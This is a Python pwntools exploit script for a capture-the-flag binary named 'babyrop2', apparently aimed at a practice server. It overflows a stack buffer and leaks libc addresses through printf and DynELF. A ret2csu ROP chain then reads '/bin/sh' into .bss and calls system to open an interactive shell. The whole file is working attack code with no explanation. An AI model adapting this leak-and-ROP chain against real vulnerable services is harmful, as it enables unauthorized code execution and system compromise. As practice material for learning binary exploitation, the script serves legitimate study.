from pwn import *


# p = process("./babyrop2")
p = remote("node4.buuoj.cn", 28806)
pro = ELF("./babyrop2")

# context.log_level = "debug"

printf_p = pro.plt["printf"]
read_g = pro.got["read"]
start = 0x00400540 
pop_rdi_ret = 0x00400733 
pop_six_ret = 0x0040072A
mov_call = 0x00400710
bss_addr = 0x00601070


def leak(addr):
    p.recvuntil("your name? ")
    pad = cyclic(0x20+0x8)
    pad += p64(pop_rdi_ret)+p64(addr)+p64(printf_p)
    pad += p64(start)
    p.send(pad)
    p.recvline()
    info = p.recvuntil("What", drop=True)
    if not info:
        info = b"\x00"

    print("leak: ", info)
    return info

# leak system
d = DynELF(leak, elf=pro)
system = d.lookup("system", "libc")
print("system : ", hex(system))

# read "/bin/sh\x00"
pad = cyclic(0x20+0x8)
pad += p64(pop_six_ret)+p64(0)+p64(1)+p64(read_g)
pad += p64(0x8)+p64(bss_addr)+p64(0)
pad += p64(mov_call)+cyclic(56)
pad += p64(start)
p.send(pad)
p.send("/bin/sh\x00")

# attack
pad = cyclic(0x20+0x8)
pad += p64(pop_rdi_ret)+p64(bss_addr)+p64(system)
p.send(pad)


p.interactive()


